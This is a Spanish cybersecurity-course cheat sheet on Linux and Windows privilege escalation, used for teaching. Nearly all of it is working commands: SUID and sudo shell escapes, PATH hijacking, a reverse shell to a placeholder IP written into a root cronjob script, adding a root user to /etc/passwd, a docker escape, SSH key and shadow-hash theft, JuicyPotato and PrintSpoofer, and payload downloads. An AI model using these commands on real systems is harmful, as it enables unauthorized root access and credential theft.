> [!info] Ficha técnica
> **Programa:** Máster en Ciberseguridad — Evolve Academy
> **Bloque:** 06 — Escalada de privilegios
> **Contenido:** Checklist completa de comandos para Linux y Windows: SUID, cronjobs, sudo -l, capabilities, tokens, JuicyPotato y GTFOBins

---

## ① Escalada Linux — Chuleta rápida paso a paso

### Paso 0: Contexto y estabilidad

```bash
whoami && id && uname -a && hostname && ip a
script /dev/null -qc bash
```

### Paso 1: Enumeración esencial

```bash
# SUID
find / -perm -4000 -type f 2>/dev/null

# Cron
crontab -l 2>/dev/null; ls -la /etc/cron* /var/spool/cron* 2>/dev/null

# Sudo
sudo -l 2>/dev/null

# Procesos
ps aux | grep -v '\['

# Red y puertos locales
ss -tulpn

# Permisos "raros"
find / -writable -type d 2>/dev/null | head
find / -perm -2 -type d 2>/dev/null | grep -v proc | head

# Archivos interesantes
ls -la /root/ /home/*/ 2>/dev/null
grep -R "password|secret|token" -n /etc 2>/dev/null | head
```

> [!note] Nota
> Si te atascas, lanza LinPEAS desde `/tmp`: recorre sistemáticamente todos estos vectores y resalta los hallazgos más prometedores.

---

## ② Rutas de escalada

### Ruta A: Binarios SUID → GTFOBins

```bash
find / -perm -4000 -type f 2>/dev/null
# Busca el binario resultante (vim, find, bash, less, tar, cp, awk, perl,
# python, openssl, mount ...) en https://gtfobins.github.io
# y aplica la técnica "SUID" indicada.
# Ejemplo con find:
find . -exec /bin/sh -p \; -quit
```

### Ruta B: sudo -l

```bash
sudo -l
# Si aparece, por ejemplo:
# (ALL) NOPASSWD: /usr/bin/vi /ruta/archivo.conf
sudo /usr/bin/vi /ruta/archivo.conf
# Dentro de vi:
:set shell=/bin/bash
:shell
# Resultado: shell como root
```

### Ruta C: Cronjobs con rutas editables

```bash
grep -R "run-parts" -n /etc/cron* 2>/dev/null
echo 'bash -c "bash -i >& /dev/tcp/TU_IP/4444 0>&1"' >> /ruta/script.sh
# Ponerse a la escucha en Kali:
nc -lvnp 4444
```

### Ruta D: Capabilities

```bash
getcap -r / 2>/dev/null
# Si aparece cap_setuid, cap_dac_read_search, etc. en python/perl/tar/openssl,
# consulta GTFOBins la técnica de "Capabilities" para ese binario.
```

### Ruta E: PATH Hijacking

```bash
echo '/bin/bash -p' > /tmp/ls && chmod +x /tmp/ls
export PATH=/tmp:$PATH  # si un script root ejecuta 'ls' sin ruta absoluta
```

### Ruta F: Archivos con permisos débiles

```bash
find /etc -type f -writable 2>/dev/null
ls -la /etc/passwd /etc/shadow
# Si /etc/passwd es escribible, añadir usuario con nueva contraseña:
openssl passwd -6 'nueva_pass'
# Copiar el hash resultante y añadir línea a /etc/passwd con uid/gid 0
```

### Ruta G: NFS con no_root_squash y grupo Docker

```bash
# NFS: compilar un binario SUID en el cliente, copiarlo al share,
# ejecutarlo en el servidor.
# Docker: si el usuario está en el grupo docker:
id
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## ③ Credenciales y hashes: recuperar y abusar

```bash
# Claves SSH
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
cat id_rsa  # copiar tal cual, incluidas líneas BEGIN/END
chmod 600 id_rsa
ssh -i id_rsa usuario@IP

# Configs con secretos
grep -R "password|passwd|secret|token" -n /opt /var/www /home /etc \
  2>/dev/null | head

# Crackear /etc/shadow si es legible
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Generar hash SHA-512 crypt (formato $6$SALT$HASH)
mkpasswd -m sha-512 'nueva_pass'
```

---

## ④ Post-root: higiene y verificación

```bash
whoami && id
cat /root/root.txt
cat ~/.bash_history 2>/dev/null
ls -la /root/ /var/backups/ 2>/dev/null
```

---

## ⑤ Escalada en Windows: modelo de seguridad y tokens

El comando `whoami /priv` muestra los privilegios habilitados del usuario actual. **SeImpersonatePrivilege** es uno de los más relevantes: permite a un proceso "impersonar" a otro usuario, y en un contexto vulnerable se puede encadenar hasta convertirse en `NT AUTHORITY\SYSTEM`.

```bash
whoami /priv
systeminfo  # versión exacta y arquitectura antes de elegir herramienta

# En sistemas modernos con SeImpersonatePrivilege:
# JuicyPotato (hasta Windows 10 / Server 2016, requiere CLSID válido)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe \
  -a "/c whoami > C:\out.txt" -t * -c {CLSID}

# PrintSpoofer (alternativa más moderna, no requiere CLSID)
PrintSpoofer.exe -i -c cmd
```

> [!note] Sistemas antiguos
> En sistemas muy antiguos (Windows Server 2003), **Churrasco** explota un CVE específico de esa época (ver el walkthrough completo de GrannY en el Bloque 5, con comandos paso a paso).

---

## ⑥ Transferencia de archivos en Windows

A diferencia de Linux, Windows no siempre tiene curl/wget disponibles por defecto. Alternativas prácticas:

```bash
# certutil (puede ser detectado por Windows Defender en sistemas modernos)
certutil -urlcache -split -f http://TU_IP/archivo.exe archivo.exe

# PowerShell
Invoke-WebRequest -Uri http://TU_IP/archivo.exe -OutFile archivo.exe
IWR http://TU_IP/archivo.exe -OutFile archivo.exe

# Servidor HTTP en Kali para servir archivos
python3 -m http.server 80
```

---

## ⑦ Casos prácticos trabajados: patrones a reconocer

### Cronjob invisible + plugin vulnerable de WordPress
Un cronjob que se ejecuta con permisos elevados sobre un plugin desactualizado permite inyectar código que se ejecuta en el siguiente ciclo.

### ShellShock
Vulnerabilidad histórica en Bash que permite ejecutar comandos a través de variables de entorno mal saneadas — payload típico: `() { :; }; comando_malicioso` en una cabecera HTTP procesada por un script CGI.

### Blind Command Injection
No se ve la salida del comando pero se confirma su ejecución por tiempos de respuesta (payload típico: `; sleep 10` y medir el retraso).

### LXD / contenedores
Pertenecer al grupo `lxd` permite crear un contenedor privilegiado que monta el disco del host, dando acceso de escritura como root al sistema de archivos completo.

---

→
